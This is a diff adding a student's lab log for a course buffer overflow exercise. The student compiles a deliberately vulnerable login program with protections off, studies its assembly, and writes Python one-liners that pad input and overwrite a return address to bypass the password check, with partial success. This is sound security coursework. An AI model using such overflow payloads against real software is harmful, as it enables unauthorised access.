@@ -1,0 +1,27 @@
+CS6014 - Buffer Overflow Attack log - Jon Pulsipher - 3/20/26
+
+1. Built login.c with clang --target=macos-x86_64 -g -O0 -fno-stack-protector -fomit-frame-pointer -Wl,-no_pie login.c
+
+2. Created password.txt "superSecretPassword"
+
+3. Ran, successfully read login, and opened shell
+
+4. Ran otool -tV a.out > loginAssemblyOtool.txt
+
+5. Drew picture of stack looking at the assembly (real paper, will not turn in.)
+
+6. What should be written in the malicious input file to overwrite the return address on the stack?
+I'm not understanding the details of the assembly code except that 0x38 bytes are reserved for the buffer. 
+So after 56 bytes we will overflow our buffer.
+
+100000000020000000003000000000400000000050000Xattack!!attack!!attack!!attack!!
+
+(equivalent of 0xdeadbeef)
+
+7. Trying to write characters in python3
+python3 -c  'import sys; sys.stdout.buffer.write(b"a"*56 + b"\xef\xbe\xad\xde")' > password.txt
+
+8. Ended up needing to lower the number of 'a's by 16. Wrote in the address of main where we do the attack.
+python3 -c  'import sys; sys.stdout.buffer.write(b"a"*40 + b"\xc7\x06\x00\x00")' > password.txt
+
+In lldb this would run to the point of 'successful login!' though it would seg fault when run directly from terminal.
